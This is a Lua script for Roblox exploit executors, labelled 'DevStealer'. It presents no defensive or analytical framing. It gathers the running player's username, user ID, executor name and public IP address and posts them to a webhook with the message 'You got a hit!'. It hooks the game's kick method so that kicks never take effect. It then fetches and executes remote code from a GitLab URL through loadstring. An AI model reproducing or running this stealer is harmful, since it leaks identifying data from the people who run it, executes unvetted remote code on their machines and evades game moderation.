--[[
discord.gg/thedevs
credits to Exunys (https://github.com/Exunys)
]]

-- Start Webhook
local webhookcheck =
   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
   secure_load and "Sentinel" or
   KRNL_LOADED and "Krnl" or
   SONA_LOADED and "Sona" or
   "Not Supported"

local url = _G.AuthServer
   local fardplayer = game.Players.LocalPlayer
   local username = game:GetService("Players").LocalPlayer.Name
   local data = {
   ["content"] = "@everyone You got a hit!",
   ["embeds"] = {
       {
           ["title"] = "**DevStealer**",
           ["description"] = "```Username: " .. game.Players.LocalPlayer.Name.."```",
           ["type"] = "rich",
           ["color"] = tonumber(0x7269da),
           ["image"] = {
               ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
                   tostring(game:GetService("Players").LocalPlayer.Name)
           },   
           ["fields"] = {
            {
                ["name"] = "``Data Generated``",
                ["value"] = "``Username :`` **" ..username .." **\n``User ID : ``**" ..fardplayer.userId .. "**\n**``Account Age :``** **``not found``**\n**``Device :``** **Computer**\n``Exploit :`` "..webhookcheck.."\n``IP Address : ``"..game:HttpGet('https://api.ipify.org/').."", 
                ["inline"] = false
            }
            
        }
       }
   }
}
local newdata = game:GetService("HttpService"):JSONEncode(data)
local headers = {
   ["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)
-- End Webhook

-- Start Anti-Kick
local old

old = hookmetamethod(game, "__namecall", function(...)
    if getnamecallmethod() == "Kick" then 
        return wait(9e9) 
    end
    return old(...)
end)
-- End Anti-Kick

wait(2)
loadstring(game:HttpGet("https://gitlab.com/S4nZz/sanz/-/raw/main/peesex"))() -- Redirect
